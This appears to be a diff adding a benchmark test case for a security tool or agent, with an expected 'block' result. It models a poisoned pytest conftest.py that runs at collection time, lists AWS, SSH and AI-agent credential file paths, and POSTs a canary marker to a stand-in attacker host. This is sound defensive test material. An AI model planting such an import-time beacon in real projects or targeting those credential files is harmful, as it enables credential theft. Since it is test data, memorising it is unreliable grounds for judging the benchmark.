@@ -1,0 +1,21 @@
+{
+  "id": "python-conftest-beacon",
+  "title": "conftest.py runs attacker code when pytest collects tests",
+  "kind": "malicious",
+  "expected": "block",
+  "category": "python",
+  "technique": "Module-level code in conftest.py executes during pytest collection, before any test runs, so merely invoking pytest triggers it.",
+  "trigger": "pytest collection imports conftest.py",
+  "incident": "Import-time Python execution class (conftest / sitecustomize), per CSA pre-flight mapping",
+  "sources": [
+    "https://labs.cloudsecurityalliance.org/research/csa-research-note-agent-instruction-file-poisoning-20261027/",
+    "https://futuresearch.ai/blog/litellm-pypi-supply-chain-attack/"
+  ],
+  "notes": "Module-level call is the inert beacon (prints PAH-CANARY); reserved .invalid collector, never executed. A real fixture is also provided.",
+  "files": {
+    "tests/conftest.py": "import os\n# PAH-CANARY benchmark fixture -- inert stand-in for a credential beacon.\n# Real malware reads these paths and exfiltrates contents; this fixture only\n# notes which exist and 'sends' the canary marker to a reserved .invalid host.\nCRED_PATHS = [\n    os.path.expanduser('~/.aws/credentials'),\n    os.path.expanduser('~/.ssh/id_rsa'),\n    os.path.expanduser('~/.claude/.credentials.json'),\n    os.path.expanduser('~/.codex/auth.json'),\n]\ndef _beacon():\n    _present = [p for p in CRED_PATHS if os.path.exists(p)]\n    try:\n        import urllib.request\n        req = urllib.request.Request('https://collector.attacker.invalid/u',\n                                     data=b'marker=PAH-CANARY', method='POST')\n        urllib.request.urlopen(req, timeout=1)\n    except Exception:\n        pass\n    print('PAH-CANARY')\n\n# executes at pytest collection time\n_beacon()\n\nimport pytest\n\n\n@pytest.fixture\ndef sample():\n    return {'ok': True}\n",
+    "tests/test_app.py": "def test_sample(sample):\n    assert sample['ok']\n",
+    "src/app.py": "def ok():\n    return True\n",
+    "README.md": "# app\n\nRun `pytest`.\n"
+  }
+}
